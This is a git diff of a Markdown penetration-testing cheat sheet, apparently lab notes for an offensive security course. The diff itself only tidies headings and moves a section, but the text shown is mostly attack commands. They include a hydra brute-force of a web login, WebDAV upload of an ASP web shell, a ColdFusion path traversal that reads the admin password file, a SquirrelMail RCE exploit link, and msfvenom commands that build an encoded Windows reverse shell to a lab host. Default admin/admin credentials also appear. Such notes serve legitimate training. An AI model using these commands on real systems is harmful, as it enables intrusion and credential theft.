@@ -161,7 +161,7 @@ You can also bruteforce by ```sh
 hydra 10.10.10.43 -l admin -P /usr/share/dict/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"```
 
 
-## - Webdav** <br />
+## - Webdav <br />
 WebDav Vulnerability Check : ```nmap -T4 -p80 --script=http-iis-webdav-vuln 10.11.1.229```
 auxiliary : ```webdav_test```
 ```davtest -url http://10.11.1.229
@@ -173,7 +173,7 @@ dav:> put shells.txt
 dav:> copy shells.txt shells.asp;.txt
 ```
 
-## - ColdFusion** <br />
+## - ColdFusion <br />
 Version check : http://example.com/CFIDE/adminapi/base.cfc?wsdl
 LFI(passowrd file) : http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 (either - neo-security.xml and password.properties)
@@ -194,10 +194,6 @@ root@kali:~/PWK-Lab/10.11.1.227$python RealVNC-exploit-36932.py
 Ctrl+Alt+Shift+Del will be vmware's ctrl+alt+del
 
 
-## - misc** <br />
-Drupal	cred(admin/admin)
-Elastix	"cred(admin/admin) http://example.com/vtigercrm/ 
-You might be able to upload shell in profile-photo.
 
 ## - SuirrelMail** <br />
 https://raw.githubusercontent.com/xl7dev/Exploit/master/SquirrelMail/SquirrelMail_RCE_exploit.sh
@@ -210,4 +206,10 @@ perl -e 'print ""\x81\xec\xac\x0d\x00\x00""' > stackadj
 msfvenom -p windows/shell/reverse_nonx_tcp LHOST=10.11.0.37 LPORT=443 R > payload
 cat stackadj payload > shellcode
 cat shellcode | msfvenom -e x86/shikata_ga_nai -b ""\x00"" -a x86 --platform win -f python
-```sh
+```
+
+
+## - misc** <br />
+Drupal	cred(admin/admin)
+Elastix	"cred(admin/admin) http://example.com/vtigercrm/ 
+You might be able to upload shell in profile-photo.
